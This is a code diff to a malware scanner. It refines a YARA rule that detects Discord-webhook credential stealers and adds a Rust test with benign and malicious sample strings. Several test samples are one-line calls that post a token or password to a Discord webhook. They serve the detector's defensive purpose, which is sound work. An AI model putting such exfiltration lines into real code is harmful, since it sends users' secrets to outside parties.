@@ -38,7 +38,9 @@ rule DiscordWebhookStealer {
         description = "Detects Discord webhook exfiltration pattern in scripts"
         severity = "critical"
     strings:
-        $hook = "discord.com/api/webhooks/" ascii nocase
+        // A webhook with its id and token, or the prefix with them joined
+        // on. The prefix alone is in every Discord library and URL check.
+        $hook = /discord(app)?\.com\/api\/webhooks\/(\d+\/[\w\-]|["'`]\s*\+|\$\{|\{)/ ascii nocase
         $token = "token" ascii nocase
         $pass = "password" ascii nocase
     condition:
@@ -239,6 +241,32 @@ mod tests {
         assert!(findings
             .iter()
             .any(|f| f.matched_pattern.contains("DiscordWebhookStealer")));
+    }
+
+    #[test]
+    fn discord_webhook_prefix_alone_is_not_a_stealer() {
+        let engine = YaraEngine::new(None);
+        let fires = |sample: &str| {
+            engine
+                .scan_data("a.js", sample.as_bytes())
+                .iter()
+                .any(|f| f.matched_pattern.contains("DiscordWebhookStealer"))
+        };
+        // A URL check and a redaction pattern, next to the word "token".
+        for sample in [
+            "if (url.startsWith('https://discord.com/api/webhooks/')) return maskToken(url);",
+            "const WEBHOOK = 'https://discord.com/api/webhooks/[REDACTED]'; // token removed",
+        ] {
+            assert!(!fires(sample), "{sample}");
+        }
+        for sample in [
+            "post('https://discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst', {token})",
+            "post('https://discordapp.com/api/webhooks/' + id + '/' + key, {password})",
+            "post(`https://discord.com/api/webhooks/${id}/${key}`, {token})",
+            "requests.post(f\"https://discord.com/api/webhooks/{wid}/{key}\", json={'token': t})",
+        ] {
+            assert!(fires(sample), "{sample}");
+        }
     }
 
     #[test]
